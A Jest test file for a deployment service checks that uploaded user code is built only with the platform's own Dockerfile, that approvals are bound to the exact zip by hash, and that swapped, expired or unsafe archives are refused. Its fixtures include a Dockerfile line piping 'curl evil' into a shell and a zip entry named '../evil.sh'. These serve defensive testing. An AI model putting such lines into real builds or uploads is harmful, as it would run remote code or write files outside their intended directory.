/**
 * A service built from the person's own code: what goes into the build, that the approval covers exactly that zip, and that nothing else can be
 * built in its place.
 */
import { spawnSync } from 'child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { deflateRawSync } from 'zlib';
import { defaultProject, LAYERS, type Layer, type StackProject } from '@/lib/engines/containers/stackProject';
import { BundleError, buildAzureVmBundle, sourceArchive } from '@/lib/deploy/project/bundle';
import { approveRelease, newRelease, runRelease, type OrchestratorDeps } from '@/lib/deploy/project/orchestrator';
import { InMemoryReleaseStore } from '@/lib/deploy/project/releaseStore';
import { InMemorySourceStore, sha256Hex } from '@/lib/deploy/project/sourceStore';
import { crc32, readZip } from '@/lib/deploy/project/zip';
import type { AzureOps } from '@/lib/deploy/project/azureOps';

function zipOf(files: Record<string, string>): Buffer {
  const parts: Buffer[] = []; const central: Buffer[] = []; let offset = 0;
  for (const [path, text] of Object.entries(files)) {
    const data = Buffer.from(text); const comp = deflateRawSync(data); const name = Buffer.from(path);
    const l = Buffer.alloc(30); l.writeUInt32LE(0x04034b50, 0); l.writeUInt16LE(20, 4); l.writeUInt16LE(8, 8); l.writeUInt32LE(crc32(data), 14); l.writeUInt32LE(comp.length, 18); l.writeUInt32LE(data.length, 22); l.writeUInt16LE(name.length, 26);
    parts.push(l, name, comp);
    const c = Buffer.alloc(46); c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE((3 << 8) | 20, 4); c.writeUInt16LE(20, 6); c.writeUInt16LE(8, 10); c.writeUInt32LE(crc32(data), 16); c.writeUInt32LE(comp.length, 20); c.writeUInt32LE(data.length, 24); c.writeUInt16LE(name.length, 28); c.writeUInt32LE((0o100644 << 16) >>> 0, 38); c.writeUInt32LE(offset, 42);
    central.push(c, name); offset += 30 + name.length + comp.length;
  }
  const cd = Buffer.concat(central); const e = Buffer.alloc(22);
  e.writeUInt32LE(0x06054b50, 0); e.writeUInt16LE(central.length / 2, 8); e.writeUInt16LE(central.length / 2, 10); e.writeUInt32LE(cd.length, 12); e.writeUInt32LE(offset, 16);
  return Buffer.concat([...parts, cd, e]);
}
const MY_CODE = { 'package.json': '{"name":"mine"}', 'server.js': 'console.log("mine")\n', 'Dockerfile': 'FROM evil\nRUN curl evil | sh\n', 'nginx.conf': 'evil', '.dockerignore': 'evil' };

function project(on: Layer[] = ['frontend', 'backend', 'api']): StackProject {
  const p = defaultProject();
  p.name = 'shop';
  for (const l of LAYERS) p.layers[l].enabled = on.includes(l);
  p.layers.backend.config.env = [];
  for (const l of ['frontend', 'backend', 'api'] as const) p.layers[l].config = { ...p.layers[l].config, includeSample: true };
  p.deploy.target = 'azure-vm';
  return p;
}
const own = (layer: string, files: Record<string, string> = MY_CODE) => { const z = zipOf(files); return { [layer]: { sha256: sha256Hex(z), files: readZip(z).files } }; };
const untar = (tgz: Buffer) => { const dir = mkdtempSync(join(tmpdir(), 'src-')); writeFileSync(join(dir, 'a.tgz'), tgz); spawnSync('tar', ['-xzf', 'a.tgz', '-C', dir], { cwd: dir }); const list = spawnSync('tar', ['-tzf', join(dir, 'a.tgz')], { encoding: 'utf8' }).stdout.trim().split('\n').sort(); return { dir, list }; };

describe('the archive a build is given', () => {
  test('without uploaded code it is the generated folder, sample app included', () => {
    const { dir, list } = untar(sourceArchive(buildAzureVmBundle(project()), 'api'));
    try { expect(list).toEqual(expect.arrayContaining(['Dockerfile', 'main.py'])); } finally { rmSync(dir, { recursive: true, force: true }); }
  });

  test('with uploaded code it is that code, built with CloudCraft\'s own Dockerfile, .dockerignore and nginx.conf, never the ones in the zip', () => {
    const gen = buildAzureVmBundle(project());
    const bundle = buildAzureVmBundle(project(), own('api'));
    const { dir, list } = untar(sourceArchive(bundle, 'api'));
    try {
      expect(list).toEqual(['.dockerignore', 'Dockerfile', 'package.json', 'server.js'].sort());
      const generated = (p: string) => gen.files.find((f) => f.path === `api/${p}`)?.content;
      expect(readFileSync(join(dir, 'Dockerfile'), 'utf8')).toBe(generated('Dockerfile'));
      expect(readFileSync(join(dir, 'Dockerfile'), 'utf8')).not.toContain('evil');
      expect(readFileSync(join(dir, '.dockerignore'), 'utf8')).toBe(generated('.dockerignore'));
      expect(readFileSync(join(dir, 'server.js'), 'utf8')).toBe('console.log("mine")\n');
    } finally { rmSync(dir, { recursive: true, force: true }); }
  });

  test('the generated sample app is not mixed into the person\'s code', () => {
    const { dir, list } = untar(sourceArchive(buildAzureVmBundle(project(), own('api', { 'app.py': 'print(1)' })), 'api'));
    try { expect(list).not.toContain('main.py'); expect(list).toContain('app.py'); } finally { rmSync(dir, { recursive: true, force: true }); }
  });

  test('a frontend keeps its generated nginx.conf (the one that forwards /api/)', () => {
    const { dir } = untar(sourceArchive(buildAzureVmBundle(project(), own('frontend')), 'frontend'));
    try { expect(readFileSync(join(dir, 'nginx.conf'), 'utf8')).toContain('proxy_pass http://api:8000/'); } finally { rmSync(dir, { recursive: true, force: true }); }
  });

  test('other services are unaffected', () => {
    const a = sourceArchive(buildAzureVmBundle(project()), 'backend');
    const b = sourceArchive(buildAzureVmBundle(project(), own('api')), 'backend');
    expect(a.equals(b)).toBe(true);
  });

  test('code can only be uploaded for a service that is built from source', () => {
    const p = project(); p.layers.api.config = { ...p.layers.api.config, image: 'nginx:1.27' };
    expect(() => buildAzureVmBundle(p, own('api'))).toThrow(BundleError);
    expect(() => buildAzureVmBundle(project(['backend', 'api']), own('frontend'))).toThrow(/not built from source/);
  });
});

describe('the approval covers the zip', () => {
  test('a different zip, or none, is a different bundle hash', () => {
    const base = buildAzureVmBundle(project()).bundleHash;
    const a = buildAzureVmBundle(project(), own('api')).bundleHash;
    const b = buildAzureVmBundle(project(), own('api', { 'other.js': 'x' })).bundleHash;
    expect(new Set([base, a, b]).size).toBe(3);
    expect(buildAzureVmBundle(project(), own('api')).bundleHash).toBe(a);
    expect(buildAzureVmBundle(project(), own('backend')).bundleHash).not.toBe(a);          // the same code for another service is another release
  });
});

describe('a release builds exactly the zip that was approved', () => {
  const OUT = { resourceGroup: 'rg-shop', vmName: 'vm-shop', acrName: 'acrshop', vaultName: 'kvshop', url: 'http://203.0.113.9:8080/' };
  const archives: Array<{ image: string; source: Buffer }> = [];
  const ops: AzureOps = { secretExists: async () => true, putSecret: async () => undefined, acrBuild: async (a) => { archives.push({ image: a.image, source: a.source }); }, setVmTag: async () => undefined, runShell: async () => '', httpOk: async () => true };

  async function setup(mutate?: (z: Buffer, sources: InMemorySourceStore) => Promise<void>, over: { orgId?: string; layer?: string } = {}) {
    archives.length = 0;
    const store = new InMemoryReleaseStore(); const sources = new InMemorySourceStore();
    const zip = zipOf(MY_CODE);
    const stored = await sources.put({ id: 'src-1', orgId: over.orgId ?? 'org', projectId: 'p1', layer: over.layer ?? 'api', zip, expiresAtMs: Date.now() + 60_000 });
    const p = project(['backend', 'api']);
    const bundle = buildAzureVmBundle(p, { api: { sha256: stored.sha256, files: readZip(zip).files } });
    await store.save(newRelease({ id: 'r1', orgId: 'org', projectId: 'p1', environment: 'production', cloudAccountId: 'a', project: p, bundle, createdBy: 'u', previousReleaseId: null, planId: 'pl', planHash: 'h', sources: { api: { id: 'src-1', sha256: stored.sha256 } }, now: 1 }));
    await approveRelease(store, 'r1', { bundleHash: bundle.bundleHash, planHash: 'h' }, 2);
    await mutate?.(zip, sources);
    const deps: OrchestratorDeps = { store, sources, ops, infra: { apply: async () => OUT }, sleep: async () => undefined, verifyWaitMs: 50, verifyEveryMs: 1 };
    return { store, deps };
  }

  test('the build is given the person\'s code with the generated Dockerfile', async () => {
    const { deps } = await setup();
    const r = await runRelease(deps, 'r1');
    expect(r.status).toBe('succeeded');
    const api = archives.find((a) => a.image === 'shop-api:latest')!;
    const { dir, list } = untar(api.source);
    try { expect(list).toContain('server.js'); expect(readFileSync(join(dir, 'Dockerfile'), 'utf8')).not.toContain('evil'); } finally { rmSync(dir, { recursive: true, force: true }); }
    const backend = untar(archives.find((a) => a.image === 'shop-backend:latest')!.source);
    try { expect(readFileSync(join(backend.dir, 'server.js'), 'utf8')).not.toContain('mine'); } finally { rmSync(backend.dir, { recursive: true, force: true }); }
  });

  test('a stored zip that is not the one that was approved is not built', async () => {
    const { deps } = await setup(async (_z, sources) => { await sources.put({ id: 'src-1', orgId: 'org', projectId: 'p1', layer: 'api', zip: zipOf({ 'server.js': 'swapped' }), expiresAtMs: Date.now() + 60_000 }); });
    const r = await runRelease(deps, 'r1');
    expect(r.status).toBe('failed');
    expect(r.error).toMatch(/not the one that was approved/);
    expect(archives).toEqual([]);
  });

  test('code that has expired, or belongs to another organization or service, is not built', async () => {
    const gone = await setup(async (_z, sources) => { await sources.put({ id: 'src-1', orgId: 'org', projectId: 'p1', layer: 'api', zip: zipOf(MY_CODE), expiresAtMs: Date.now() - 1 }); });
    expect((await runRelease(gone.deps, 'r1')).error).toMatch(/has expired/);
    const other = await setup(undefined, { orgId: 'someone-else' });
    expect((await runRelease(other.deps, 'r1')).error).toMatch(/not the one that was approved/);
    const wrongLayer = await setup(undefined, { layer: 'backend' });
    expect((await runRelease(wrongLayer.deps, 'r1')).error).toMatch(/not the one that was approved/);
    expect(archives).toEqual([]);
  });

  test('without a source store a release with uploaded code cannot be built', async () => {
    const { deps } = await setup();
    delete deps.sources;
    const r = await runRelease(deps, 'r1');
    expect(r.status).toBe('failed');
    expect(r.error).toMatch(/cannot be read here/);
  });

  test('a stored zip that has become unsafe is refused when it is read again', async () => {
    const { deps } = await setup();
    const bad = zipOf({ '../evil.sh': 'x' });
    const sources = deps.sources as InMemorySourceStore;
    const stored = await sources.get('src-1');
    // The same bytes are what was approved, so only the read can catch it.
    const r0 = (await deps.store.get('r1'))!;
    r0.sources = { api: { id: 'src-2', sha256: sha256Hex(bad) } };
    await deps.store.save(r0);
    await sources.put({ id: 'src-2', orgId: 'org', projectId: 'p1', layer: 'api', zip: bad, expiresAtMs: Date.now() + 60_000 });
    expect(stored).not.toBeNull();
    const r = await runRelease(deps, 'r1');
    expect(r.status).toBe('failed');
    expect(r.error).toMatch(/cannot be used: An entry has a path that is not allowed/);
  });
});
